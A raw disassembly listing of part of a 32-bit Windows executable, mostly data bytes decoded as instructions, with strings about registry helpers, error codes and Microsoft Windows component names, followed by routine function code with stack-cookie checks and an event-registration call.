  40250d:	outs   dx,BYTE PTR ds:[esi]
  40250e:	outs   dx,WORD PTR ds:[esi]
  402510:	jb     0x40257f
  402512:	popa   
  402513:	je     0x40257e
  402515:	outs   dx,DWORD PTR ds:[esi]
  402516:	outs   dx,BYTE PTR ds:[esi]
  402517:	add    BYTE PTR [ebx+0x69],dl
  40251a:	ins    DWORD PTR es:[edi],dx
  40251b:	jo     0x402589
  40251d:	add    BYTE PTR gs:[eax],al
  402520:	dec    ebp
  402521:	gs je  0x402596
  402524:	imul   esp,DWORD PTR [ebx+0x0],0x73654d00
  40252b:	jae    0x40258e
  40252d:	add    BYTE PTR gs:[bx+0x75],cl
  402532:	je     0x402554
  402534:	outs   dx,DWORD PTR ds:[esi]
  402535:	data16 and BYTE PTR [ebp+0x65],ch
  402539:	ins    DWORD PTR es:[edi],dx
  40253a:	outs   dx,DWORD PTR ds:[esi]
  40253b:	jb     0x4025b6
  40253d:	add    BYTE PTR [eax],al
  40253f:	add    BYTE PTR [ecx+0x73],al
  402542:	ins    BYTE PTR es:[edi],dx
  402543:	push   esp
  402544:	gs ins BYTE PTR es:[edi],dx
  402546:	gs ins DWORD PTR es:[edi],dx
  402548:	gs je  0x4025bd
  40254b:	jns    0x402590
  40254d:	jb     0x4025b4
  40254f:	popa   
  402550:	je     0x4025b7
  402552:	add    BYTE PTR [eax],al
  402554:	add    BYTE PTR [eax],al
  402556:	add    BYTE PTR [eax],al
  402558:	cmp    eax,DWORD PTR [eax]
  40255a:	add    BYTE PTR [eax],al
  40255c:	and    eax,0x45000064
  402561:	push   edx
  402562:	push   edx
  402563:	dec    edi
  402564:	push   edx
  402565:	and    esp,DWORD PTR ds:0x64252373
  40256b:	add    BYTE PTR [eax],bl
  40256d:	and    eax,0x25200040
  402572:	inc    eax
  402573:	add    BYTE PTR [eax],ch
  402575:	and    eax,0x61460040
  40257a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  402582:	jno    0x4025f9
  402584:	gs jb  0x402600
  402587:	and    BYTE PTR [ebx+0x65],ch
  40258a:	jns    0x4025ac
  40258c:	jbe    0x4025ef
  40258e:	ins    BYTE PTR es:[edi],dx
  40258f:	jne    0x4025f6
  402591:	and    BYTE PTR [ebx+0x25],bl
  402594:	js     0x4025f3
  402596:	add    BYTE PTR [eax],al
  402598:	inc    ecx
  402599:	jae    0x402607
  40259b:	push   edx
  40259c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x65477972
  4025a5:	je     0x4025fc
  4025a7:	dec    ecx
  4025a8:	outs   dx,BYTE PTR ds:[esi]
  4025a9:	je     0x4025de
  4025ab:	xor    bl,BYTE PTR [edi+0x55]
  4025ae:	push   ebx
  4025af:	je     0x402623
  4025b1:	add    BYTE PTR [eax],al
  4025b3:	add    BYTE PTR [ecx+0x6e],cl
  4025b6:	jbe    0x402619
  4025b8:	ins    BYTE PTR es:[edi],dx
  4025b9:	imul   esp,DWORD PTR [eax+eiz*1+0x76],0x65756c61
  4025c1:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4025c5:	add    BYTE PTR gs:[eax],al
  4025c8:	push   edx
  4025c9:	je     0x402637
  4025cb:	dec    ecx
  4025cc:	outs   dx,BYTE PTR ds:[esi]
  4025cd:	imul   esi,DWORD PTR [ebp+edx*2+0x6e],0x646f6369
  4025d5:	gs push ebx
  4025d7:	je     0x40264b
  4025d9:	imul   ebp,DWORD PTR [esi+0x67],0x66207845
  4025e0:	popa   
  4025e1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x78255b20
  4025e9:	pop    ebp
  4025ea:	add    BYTE PTR [eax],al
  4025ec:	inc    ecx
  4025ed:	jae    0x40265b
  4025ef:	push   edx
  4025f0:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x65477972
  4025f9:	je     0x402650
  4025fb:	dec    ecx
  4025fc:	outs   dx,BYTE PTR ds:[esi]
  4025fd:	je     0x402632
  4025ff:	xor    al,BYTE PTR [eax]
  402601:	add    BYTE PTR [eax],al
  402603:	add    BYTE PTR [eax+eax*1+0x52],bl
  402607:	add    BYTE PTR [ebp+0x0],ah
  40260a:	add    BYTE PTR [bx+di+0x0],ch
  40260e:	jae    0x402610
  402610:	je     0x402612
  402612:	jb     0x402614
  402614:	jns    0x402616
  402616:	pop    esp
  402617:	add    BYTE PTR [ebp+0x0],cl
  40261a:	popa   
  40261b:	add    BYTE PTR [ebx+0x0],ah
  40261e:	push   0x6e006900
  402623:	add    BYTE PTR [ebp+0x0],ah
  402626:	add    BYTE PTR [eax],al
  402628:	inc    esi
  402629:	popa   
  40262a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  402632:	popa   
  402633:	ins    BYTE PTR es:[edi],dx
  402634:	ins    BYTE PTR es:[edi],dx
  402635:	outs   dx,DWORD PTR ds:[esi]
  402636:	arpl   WORD PTR [ecx+0x74],sp
  402639:	and    BYTE PTR gs:0x79622064,ah
  402640:	je     0x4026a7
  402642:	jae    0x402664
  402644:	outs   dx,WORD PTR ds:[esi]
  402646:	jb     0x402668
  402648:	jne    0x4026bd
  40264a:	gs jb  0x40266d
  40264d:	imul   esp,DWORD PTR [ebp+0x79],0x20
  402651:	bound  esi,QWORD PTR [ebp+0x66]
  402654:	data16 gs jb 0x402658
  402658:	inc    ecx
  402659:	jae    0x4026c7
  40265b:	push   edx
  40265c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x75427972
  402665:	imul   ebp,DWORD PTR [esp+eiz*2+0x4d],0x69686361
  40266d:	outs   dx,BYTE PTR ds:[esi]
  40266e:	gs push eax
  402670:	popa   
  402671:	je     0x4026db
  402673:	add    BYTE PTR [ecx+0x73],al
  402676:	ins    BYTE PTR es:[edi],dx
  402677:	push   edx
  402678:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x75427972
  402681:	imul   ebp,DWORD PTR [esp+eiz*2+0x4d],0x69686361
  402689:	outs   dx,BYTE PTR ds:[esi]
  40268a:	gs push eax
  40268c:	popa   
  40268d:	je     0x4026f7
  40268f:	and    BYTE PTR [esi+0x61],ah
  402692:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x726f6620
  40269a:	and    BYTE PTR ds:0x5b207377,ah
  4026a0:	and    eax,0x41005d78
  4026a5:	jae    0x402713
  4026a7:	push   edx
  4026a8:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x65477972
  4026b1:	je     0x4026fe
  4026b3:	gs jns 0x4026b6
  4026b6:	add    BYTE PTR [eax],al
  4026b8:	dec    esi
  4026b9:	je     0x40270a
  4026bb:	jo     0x402722
  4026bd:	outs   dx,BYTE PTR ds:[esi]
  4026be:	dec    ebx
  4026bf:	gs jns 0x4026e2
  4026c2:	popaw  
  4026c4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x726f6620
  4026cc:	and    BYTE PTR ds:0x5b207377,ah
  4026d2:	and    eax,0x5d78
	...
  4026e3:	add    BYTE PTR [eax],ah
  4026e5:	cmp    ebx,DWORD PTR [edi+0x55]
  4026eb:	add    BYTE PTR [edx],al
  4026ed:	add    BYTE PTR [eax],al
  4026ef:	add    BYTE PTR [edx],ah
  4026f1:	add    BYTE PTR [eax],al
  4026f3:	add    al,al
  4026f5:	sub    BYTE PTR [eax],al
  4026f7:	add    al,al
  4026f9:	sbb    al,0x0
  4026fb:	add    BYTE PTR [eax],al
  4026fd:	add    BYTE PTR [eax],al
  4026ff:	add    BYTE PTR [eax],ah
  402701:	cmp    ebx,DWORD PTR [edi+0x55]
  402707:	add    BYTE PTR ds:0xfc000000,cl
  40270d:	add    al,BYTE PTR [eax]
  40270f:	add    al,bh
  402711:	sub    BYTE PTR [eax],al
  402713:	add    al,bh
  402715:	sbb    al,0x0
	...
  402737:	add    BYTE PTR [eax+0x0],ch
	...
  402772:	add    BYTE PTR [eax],al
  402774:	add    al,0x90
  402776:	inc    eax
  402777:	add    BYTE PTR [eax+0x6004027],ah
  40277d:	add    BYTE PTR [eax],al
  40277f:	add    ah,al
  402781:	mov    eax,ds:0x40
  402786:	add    BYTE PTR [eax],al
  402788:	sub    BYTE PTR [eax],dl
  40278a:	inc    eax
  40278b:	add    BYTE PTR [ebx],bl
  40278d:	add    BYTE PTR [eax],al
  40278f:	add    BYTE PTR [eax],al
  402791:	xor    eax,0x0
	...
  40279e:	add    BYTE PTR [eax],al
  4027a0:	shl    BYTE PTR [edi+0x0],0x0
  4027a4:	fnstsw WORD PTR [edx+0x0]
  4027a7:	add    BYTE PTR [edx-0x2bffff85],cl
  4027ad:	jnp    0x4027af
  4027af:	add    BYTE PTR [esi],bl
  4027b1:	jl     0x4027b3
  4027b3:	add    BYTE PTR [eax+0x7c],ah
  4027b6:	add    BYTE PTR [eax],al
  4027b8:	inc    ebp
  4027b9:	push   esp
  4027ba:	push   edi
  4027bb:	xor    BYTE PTR [eax],dl
  4027bd:	add    BYTE PTR [eax],al
  4027bf:	add    BYTE PTR [esi+0x2b88040e],al
  4027c5:	add    eax,0xb03bb8a
  4027ca:	add    eax,0x0
  4027cf:	add    BYTE PTR [eax],al
  4027d1:	and    BYTE PTR [eax],al
  4027d3:	add    BYTE PTR [ebp+0x0],ch
  4027d6:	add    BYTE PTR [ebp+eiz*2+0x6c],dl
  4027da:	gs ins DWORD PTR es:[edi],dx
  4027dc:	gs je  0x402851
  4027df:	jns    0x402824
  4027e1:	ins    BYTE PTR es:[edi],dx
  4027e2:	imul   esp,DWORD PTR [ebp+0x6e],0x69420074
  4027e9:	outs   dx,BYTE PTR ds:[esi]
  4027ea:	inc    esi
  4027eb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4027f3:	outs   dx,DWORD PTR ds:[esi]
  4027f4:	outs   dx,BYTE PTR ds:[esi]
  4027f5:	add    BYTE PTR [edx],cl
  4027f7:	inc    ebx
  4027f8:	push   0x656e6e61
  4027fd:	ins    BYTE PTR es:[edi],dx
  4027fe:	dec    esi
  4027ff:	popa   
  402800:	ins    DWORD PTR es:[edi],dx
  402801:	add    BYTE PTR gs:[edx],al
  402804:	inc    ebx
  402805:	outs   dx,DWORD PTR ds:[esi]
  402806:	jb     0x40287a
  402808:	gs ins BYTE PTR es:[edi],dx
  40280a:	popa   
  40280b:	je     0x402876
  40280d:	outs   dx,DWORD PTR ds:[esi]
  40280e:	outs   dx,BYTE PTR ds:[esi]
  40280f:	push   esi
  402810:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  402815:	jae    0x402817
  402817:	add    dl,BYTE PTR [ecx+edi*2+0x70]
  40281b:	gs jae 0x40281e
  40281e:	add    cl,BYTE PTR [esi+0x61]
  402821:	ins    DWORD PTR es:[edi],dx
  402822:	gs jae 0x402825
  402825:	add    al,BYTE PTR [ebx+0x6f]
  402828:	jne    0x402898
  40282a:	je     0x40289f
  40282c:	add    BYTE PTR [edx],al
  40282e:	dec    ebp
  40282f:	gs je  0x4028a4
  402832:	imul   esp,DWORD PTR [ebx+0x73],0x654d0200
  402839:	jae    0x4028ae
  40283b:	popa   
  40283c:	addr16 gs jae 0x402840
  402840:	add    al,BYTE PTR [ecx+esi*2]
  402843:	pop    ds
  402844:	jns    0x4028ba
  402846:	push   ds
  402847:	(bad)
  40284b:	jae    0x4027fb
  40284d:	jg     0x402800
  40284f:	pop    ebx
  402850:	or     eax,0x4d002324
  402855:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40285c:	je     0x40288c
  40285e:	push   edi
  40285f:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  402866:	inc    ecx
  402867:	jo     0x4028d9
  402869:	dec    eax
  40286a:	gs ins BYTE PTR es:[edi],dx
  40286c:	jo     0x40289c
  40286e:	inc    esp
  40286f:	imul   esp,DWORD PTR [ecx+0x6c],0x400676f
  402876:	bound  ecx,QWORD PTR [esi-0x59d7e7a0]
  40287c:	(bad)  [ecx-0x74]
  40287f:	add    dl,BYTE PTR [ebp-0x69]
  402882:	or     DWORD PTR cs:[ebp+0x24],edi
  402886:	cmp    DWORD PTR [eax],eax
  402888:	dec    ebp
  402889:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402890:	je     0x4028c0
  402892:	push   edi
  402893:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40289a:	inc    ebx
  40289b:	outs   dx,DWORD PTR ds:[esi]
  40289c:	ins    DWORD PTR es:[edi],dx
  40289d:	jo     0x402900
  40289f:	je     0x40290a
  4028a1:	bound  ebp,QWORD PTR [ecx+0x6c]
  4028a4:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6c7341
  4028ac:	adc    eax,DWORD PTR [eax]
  4028ae:	add    DWORD PTR [edx],ebx
  4028b0:	jae    0x402902
  4028b2:	dec    edi
  4028b3:	iret   
  4028b4:	mov    DWORD PTR [edx-0x231f4cb9],eax
  4028ba:	call   0xbab62d88
  4028bf:	add    DWORD PTR [edx+0x53],edx
  4028c2:	inc    esp
  4028c3:	push   ebx
  4028c4:	cmp    ebp,0xffffffa8
  4028c7:	in     al,0x5b
  4028c9:	rol    DWORD PTR [edi+0x43],1
  4028cc:	mov    ebx,0x50947a69
  4028d1:	xor    DWORD PTR ds:0x1ab,edi
  4028d7:	add    BYTE PTR [eax+0x63],dh
  4028da:	popa   
  4028db:	jne    0x402946
  4028dd:	cs jo  0x402944
  4028e0:	bound  eax,QWORD PTR [eax]
	...
  4028f6:	add    BYTE PTR [eax],al
  4028f8:	inc    edi
  4028f9:	inc    ebx
  4028fa:	push   esp
  4028fb:	dec    esp
  4028fc:	add    BYTE PTR [eax],dl
  4028fe:	add    BYTE PTR [eax],al
  402900:	add    al,0x0
  402902:	add    BYTE PTR [eax],al
  402904:	cs inc ebx
  402906:	push   edx
  402907:	push   esp
  402908:	and    al,0x58
  40290a:	inc    ebx
  40290b:	inc    ecx
  40290c:	add    BYTE PTR [eax],al
  40290e:	add    BYTE PTR [eax],al
  402910:	add    al,0x10
  402912:	add    BYTE PTR [eax],al
  402914:	add    al,0x0
  402916:	add    BYTE PTR [eax],al
  402918:	cs inc ebx
  40291a:	push   edx
  40291b:	push   esp
  40291c:	and    al,0x58
  40291e:	inc    ebx
  40291f:	inc    ecx
  402920:	inc    ecx
  402921:	add    BYTE PTR [eax],al
  402923:	add    BYTE PTR [eax],cl
  402925:	adc    BYTE PTR [eax],al
  402927:	add    BYTE PTR [eax+eax*1],cl
  40292a:	add    BYTE PTR [eax],al
  40292c:	cs inc ebx
  40292e:	push   edx
  40292f:	push   esp
  402930:	and    al,0x58
  402932:	inc    ebx
  402933:	push   ebp
  402934:	add    BYTE PTR [eax],al
  402936:	add    BYTE PTR [eax],al
  402938:	adc    al,0x10
  40293a:	add    BYTE PTR [eax],al
  40293c:	add    al,0x0
  40293e:	add    BYTE PTR [eax],al
  402940:	cs inc ebx
  402942:	push   edx
  402943:	push   esp
  402944:	and    al,0x58
  402946:	inc    ebx
  402947:	pop    edx
  402948:	add    BYTE PTR [eax],al
  40294a:	add    BYTE PTR [eax],al
  40294c:	sbb    BYTE PTR [eax],dl
  40294e:	add    BYTE PTR [eax],al
  402950:	add    al,0x0
  402952:	add    BYTE PTR [eax],al
  402954:	cs inc ebx
  402956:	push   edx
  402957:	push   esp
  402958:	and    al,0x58
  40295a:	dec    ecx
  40295b:	inc    ecx
  40295c:	add    BYTE PTR [eax],al
  40295e:	add    BYTE PTR [eax],al
  402960:	sbb    al,0x10
  402962:	add    BYTE PTR [eax],al
  402964:	add    al,0x0
  402966:	add    BYTE PTR [eax],al
  402968:	cs inc ebx
  40296a:	push   edx
  40296b:	push   esp
  40296c:	and    al,0x58
  40296e:	dec    ecx
  40296f:	inc    ecx
  402970:	inc    ecx
  402971:	add    BYTE PTR [eax],al
  402973:	add    BYTE PTR [eax],ah
  402975:	adc    BYTE PTR [eax],al
  402977:	add    BYTE PTR [eax+eax*1],al
  40297a:	add    BYTE PTR [eax],al
  40297c:	cs inc ebx
  40297e:	push   edx
  40297f:	push   esp
  402980:	and    al,0x58
  402982:	dec    ecx
  402983:	pop    ecx
  402984:	add    BYTE PTR [eax],al
  402986:	add    BYTE PTR [eax],al
  402988:	and    al,0x10
  40298a:	add    BYTE PTR [eax],al
  40298c:	add    al,0x0
  40298e:	add    BYTE PTR [eax],al
  402990:	cs inc ebx
  402992:	push   edx
  402993:	push   esp
  402994:	and    al,0x58
  402996:	dec    ecx
  402997:	pop    edx
  402998:	add    BYTE PTR [eax],al
  40299a:	add    BYTE PTR [eax],al
  40299c:	sub    BYTE PTR [eax],dl
  40299e:	add    BYTE PTR [eax],al
  4029a0:	ins    BYTE PTR es:[edi],dx
  4029a1:	add    BYTE PTR [eax],al
  4029a3:	add    BYTE PTR [esi],ch
  4029a5:	imul   sp,WORD PTR [si+0x73],0x7824
  4029ac:	add    BYTE PTR [eax],al
  4029ae:	add    BYTE PTR [eax],al
  4029b0:	mov    al,ds:0x10
  4029b5:	pop    ss
  4029b6:	add    BYTE PTR [eax],al
  4029b8:	cs jb  0x402a1f
  4029bb:	popa   
  4029bc:	je     0x402a1f
  4029be:	add    BYTE PTR [eax],al
  4029c0:	mov    al,ds:0x18000027
  4029c5:	add    BYTE PTR [eax],al
  4029c7:	add    BYTE PTR [esi],ch
  4029c9:	jb     0x402a2f
  4029cb:	popa   
  4029cc:	je     0x402a2f
  4029ce:	and    al,0x73
  4029d0:	js     0x402a36
  4029d2:	popa   
  4029d3:	je     0x402a36
  4029d5:	add    BYTE PTR [eax],al
  4029d7:	add    BYTE PTR [eax+0x10000027],bh
  4029dd:	add    BYTE PTR [eax],al
  4029df:	add    BYTE PTR [esi],ch
  4029e1:	jb     0x402a47
  4029e3:	popa   
  4029e4:	je     0x402a47
  4029e6:	and    al,0x7a
  4029e8:	inc    ebp
  4029e9:	push   esp
  4029ea:	push   edi
  4029eb:	xor    BYTE PTR [eax],al
  4029ed:	add    BYTE PTR [eax],al
  4029ef:	add    al,cl
  4029f1:	daa    
  4029f2:	add    BYTE PTR [eax],al
  4029f4:	jns    0x4029f6
  4029f6:	add    BYTE PTR [eax],al
  4029f8:	cs jb  0x402a5f
  4029fb:	popa   
  4029fc:	je     0x402a5f
  4029fe:	and    al,0x7a
  402a00:	inc    ebp
  402a01:	push   esp
  402a02:	push   edi
  402a03:	xor    DWORD PTR [eax],eax
  402a05:	add    BYTE PTR [eax],al
  402a07:	add    BYTE PTR [ecx+0x28],al
  402a0a:	add    BYTE PTR [eax],al
  402a0c:	jle    0x402a0e
  402a0e:	add    BYTE PTR [eax],al
  402a10:	cs jb  0x402a77
  402a13:	popa   
  402a14:	je     0x402a77
  402a16:	and    al,0x7a
  402a18:	inc    ebp
  402a19:	push   esp
  402a1a:	push   edi
  402a1b:	xor    al,BYTE PTR [eax]
  402a1d:	add    BYTE PTR [eax],al
  402a1f:	add    BYTE PTR [edi+0x1000028],bh
  402a25:	add    BYTE PTR [eax],al
  402a27:	add    BYTE PTR [esi],ch
  402a29:	jb     0x402a8f
  402a2b:	popa   
  402a2c:	je     0x402a8f
  402a2e:	and    al,0x7a
  402a30:	inc    ebp
  402a31:	push   esp
  402a32:	push   edi
  402a33:	cmp    DWORD PTR [eax],eax
  402a35:	add    BYTE PTR [eax],al
  402a37:	add    al,al
  402a39:	sub    BYTE PTR [eax],al
  402a3b:	add    BYTE PTR [ebx+eax*1],dh
  402a3e:	add    BYTE PTR [eax],al
  402a40:	cs jb  0x402aa7
  402a43:	popa   
  402a44:	je     0x402aa7
  402a46:	and    al,0x7a
  402a48:	jp     0x402ac4
  402a4a:	bound  esp,QWORD PTR fs:[edi+0x0]
  402a4e:	add    BYTE PTR [eax],al
  402a50:	hlt    
  402a51:	sub    eax,DWORD PTR [eax]
  402a53:	add    bl,bh
  402a55:	add    DWORD PTR [eax],eax
  402a57:	add    BYTE PTR [esi],ch
  402a59:	je     0x402ac0
  402a5b:	js     0x402ad1
  402a5d:	add    BYTE PTR [eax],al
  402a5f:	add    bh,ch
  402a61:	sub    eax,0x4d0000
  402a66:	add    BYTE PTR [eax],al
  402a68:	cs je  0x402ad0
  402a6b:	js     0x402ae1
  402a6d:	and    al,0x64
  402a6f:	imul   eax,DWORD PTR [eax],0x40000000
  402a75:	add    BYTE PTR cs:[eax],al
  402a78:	or     BYTE PTR [eax+eax*1+0x0],0x2e
  402a7d:	je     0x402ae4
  402a7f:	js     0x402af5
  402a81:	and    al,0x6d
  402a83:	outs   dx,BYTE PTR ds:[esi]
  402a84:	add    BYTE PTR [eax],al
  402a86:	add    BYTE PTR [eax],al
  402a88:	ret    0x7a
  402a8b:	add    bl,al
  402a8d:	add    DWORD PTR [eax],eax
  402a8f:	add    BYTE PTR [esi],ch
  402a91:	je     0x402af8
  402a93:	js     0x402b09
  402a95:	and    al,0x78
  402a97:	add    BYTE PTR [ebp+0x4e00007c],al
  402a9d:	add    BYTE PTR [eax],al
  402a9f:	add    BYTE PTR [esi],ch
  402aa1:	je     0x402b08
  402aa3:	js     0x402b19
  402aa5:	and    al,0x79
  402aa7:	add    BYTE PTR fs:[eax],al
  402aaa:	add    BYTE PTR [eax],al
  402aac:	fdivr  DWORD PTR [eax+eax*1+0x0]
  402ab0:	and    al,0x2
  402ab2:	add    BYTE PTR [eax],al
  402ab4:	cs js  0x402b1b
  402ab7:	popa   
  402ab8:	je     0x402b1b
  402aba:	and    al,0x78
  402abc:	add    BYTE PTR [eax],al
  402abe:	add    BYTE PTR [eax],al
  402ac0:	cld    
  402ac1:	jle    0x402ac3
  402ac3:	add    BYTE PTR [eax+0x0],ah
  402ac6:	add    BYTE PTR [eax],al
  402ac8:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3224
  402ad2:	add    BYTE PTR [eax],al
  402ad4:	pop    esp
  402ad5:	jg     0x402ad7
  402ad7:	add    BYTE PTR [eax],ah
  402ad9:	add    BYTE PTR [eax],al
  402adb:	add    BYTE PTR [esi],ch
  402add:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3324
  402ae6:	add    BYTE PTR [eax],al
  402ae8:	jl     0x402b69
  402aea:	add    BYTE PTR [eax],al
  402aec:	and    al,0x0
  402aee:	add    BYTE PTR [eax],al
  402af0:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3424
  402afa:	add    BYTE PTR [eax],al
  402afc:	mov    al,ds:0x7e00007f
  402b01:	add    BYTE PTR [eax],al
  402b03:	add    BYTE PTR [esi],ch
  402b05:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3624
  402b0e:	add    BYTE PTR [eax],al
  402b10:	and    BYTE PTR [eax+0x240000],al
  402b16:	add    BYTE PTR [eax],al
  402b18:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3724
  402b22:	add    BYTE PTR [eax],al
  402b24:	add    BYTE PTR [eax+0x400000],dl
  402b2a:	add    BYTE PTR [eax],al
  402b2c:	cs fs popa 
  402b2f:	je     0x402b92
  402b31:	add    BYTE PTR [eax],al
  402b33:	add    BYTE PTR [eax-0x70],al
  402b36:	add    BYTE PTR [eax],al
  402b38:	xchg   esp,eax
  402b39:	add    eax,DWORD PTR [eax]
  402b3b:	add    BYTE PTR [esi],ch
  402b3d:	bound  esi,QWORD PTR [ebx+0x73]
  402b40:	add    BYTE PTR [eax],al
  402b42:	add    BYTE PTR [eax],al
  402b44:	add    BYTE PTR [eax+0x1c40000],ah
  402b4a:	add    BYTE PTR [eax],al
  402b4c:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  402b55:	add    BYTE PTR [eax],al
  402b57:	add    ah,al
  402b59:	mov    eax,ds:0x40000
  402b5e:	add    BYTE PTR [eax],al
  402b60:	xor    BYTE PTR cs:[eax],dh
  402b63:	arpl   WORD PTR [esi+0x67],sp
  402b66:	add    BYTE PTR [eax],al
  402b68:	enter  0xa1,0x0
  402b6c:	add    al,0x1
  402b6e:	add    BYTE PTR [eax],al
  402b70:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  402b79:	add    BYTE PTR [eax],al
  402b7b:	add    ah,cl
  402b7d:	mov    ds:0x140000,al
  402b82:	add    BYTE PTR [eax],al
  402b84:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  402b8d:	add    BYTE PTR [eax],al
  402b8f:	add    al,ah
  402b91:	mov    ds:0x1c40000,al
  402b96:	add    BYTE PTR [eax],al
  402b98:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x342461
  402ba1:	add    BYTE PTR [eax],al
  402ba3:	add    BYTE PTR [esp+eiz*4+0x85c0000],ah
  402baa:	add    BYTE PTR [eax],al
  402bac:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  402bb5:	add    BYTE PTR [eax],al
  402bb7:	add    BYTE PTR [eax],al
  402bb9:	mov    al,0x0
  402bbb:	add    BYTE PTR [eax+eax*1],ah
  402bbe:	add    BYTE PTR [eax],al
  402bc0:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3524
  402bca:	add    BYTE PTR [eax],al
  402bcc:	add    al,al
  402bce:	add    BYTE PTR [eax],al
  402bd0:	mov    al,ds:0x2e000000
  402bd5:	jb     0x402c4a
  402bd7:	jb     0x402c3c
  402bd9:	and    al,0x30
  402bdb:	xor    DWORD PTR [eax],eax
  402bdd:	add    BYTE PTR [eax],al
  402bdf:	add    BYTE PTR [eax+0x780000c0],ah
  402be5:	or     BYTE PTR [eax],al
  402be7:	add    BYTE PTR [esi],ch
  402be9:	jb     0x402c5e
  402beb:	jb     0x402c50
  402bed:	and    al,0x30
  402bef:	xor    al,BYTE PTR [eax]
	...
  402bfd:	add    BYTE PTR [eax],al
  402bff:	add    BYTE PTR [ebx-0x1374aa01],cl
  402c05:	push   ecx
  402c06:	mov    eax,ds:0x409004
  402c0b:	xor    eax,ebp
  402c0d:	mov    DWORD PTR [ebp-0x4],eax
  402c10:	mov    eax,DWORD PTR [ebp+0x28]
  402c13:	test   eax,eax
  402c15:	je     0x402c82
  402c17:	mov    ecx,DWORD PTR [ebp+0xc]
  402c1a:	mov    edx,DWORD PTR [ebp+0x10]
  402c1d:	push   ebx
  402c1e:	mov    ebx,DWORD PTR [ebp+0x1c]
  402c21:	push   edi
  402c22:	mov    edi,DWORD PTR [ebp+0x20]
  402c25:	sub    ecx,0x0
  402c28:	je     0x402c54
  402c2a:	sub    ecx,0x1
  402c2d:	jne    0x402c57
  402c2f:	test   dl,dl
  402c31:	je     0x402c39
  402c33:	movzx  ecx,dl
  402c36:	inc    ecx
  402c37:	jmp    0x402c3e
  402c39:	mov    ecx,0x100
  402c3e:	mov    DWORD PTR [eax],ecx
  402c40:	mov    ecx,DWORD PTR [ebp+0x14]
  402c43:	mov    DWORD PTR [eax+0x8],ecx
  402c46:	mov    ecx,DWORD PTR [ebp+0x18]
  402c49:	mov    DWORD PTR [eax+0xc],ecx
  402c4c:	mov    DWORD PTR [eax+0x10],ebx
  402c4f:	mov    DWORD PTR [eax+0x14],edi
  402c52:	jmp    0x402c5a
  402c54:	and    DWORD PTR [eax],0x0
  402c57:	mov    ecx,DWORD PTR [ebp+0x18]
  402c5a:	push   esi
  402c5b:	mov    esi,DWORD PTR [eax+0x20]
  402c5e:	test   esi,esi
  402c60:	je     0x402c7f
  402c62:	push   DWORD PTR [eax+0x24]
  402c65:	push   DWORD PTR [ebp+0x24]
  402c68:	push   edi
  402c69:	push   ebx
  402c6a:	push   ecx
  402c6b:	push   DWORD PTR [ebp+0x14]
  402c6e:	mov    ecx,esi
  402c70:	push   edx
  402c71:	push   DWORD PTR [ebp+0xc]
  402c74:	push   DWORD PTR [ebp+0x8]
  402c77:	call   DWORD PTR ds:0x40a1c4
  402c7d:	call   esi
  402c7f:	pop    esi
  402c80:	pop    edi
  402c81:	pop    ebx
  402c82:	mov    ecx,DWORD PTR [ebp-0x4]
  402c85:	xor    ecx,ebp
  402c87:	call   0x407330
  402c8c:	mov    esp,ebp
  402c8e:	pop    ebp
  402c8f:	ret    0x24
  402c92:	int3   
  402c93:	int3   
  402c94:	int3   
  402c95:	int3   
  402c96:	int3   
  402c97:	mov    edi,edi
  402c99:	push   ebp
  402c9a:	mov    ebp,esp
  402c9c:	sub    esp,0x14
  402c9f:	mov    eax,ds:0x409004
  402ca4:	xor    eax,ebp
  402ca6:	mov    DWORD PTR [ebp-0x4],eax
  402ca9:	push   esi
  402caa:	mov    esi,DWORD PTR ds:0x409014
  402cb0:	lea    eax,[ebp-0x14]
  402cb3:	push   edi
  402cb4:	lea    edi,[ebp-0x14]
  402cb7:	push   0x409028
  402cbc:	lea    esi,[esi-0x10]
  402cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cc0:	push   0x409010
  402cc5:	push   0x402c00
  402cca:	push   eax
  402ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cce:	and    DWORD PTR ds:0x409030,0x0
  402cd5:	and    DWORD PTR ds:0x409034,0x0
  402cdc:	call   DWORD PTR ds:0x40a00c
  402ce2:	mov    esi,eax
  402ce4:	test   esi,esi
  402ce6:	je     0x402cf5
  402ce8:	jle    0x402d05
  402cea:	movzx  esi,si
  402ced:	or     esi,0x80070000
  402cf3:	jmp    0x402d05
  402cf5:	mov    ecx,DWORD PTR ds:0x409014
  402cfb:	movzx  eax,WORD PTR [ecx]
  402cfe:	push   eax
  402cff:	push   ecx
  402d00:	call   0x402d1c
  402d05:	mov    ecx,DWORD PTR [ebp-0x4]
  402d08:	mov    eax,esi
  402d0a:	pop    edi
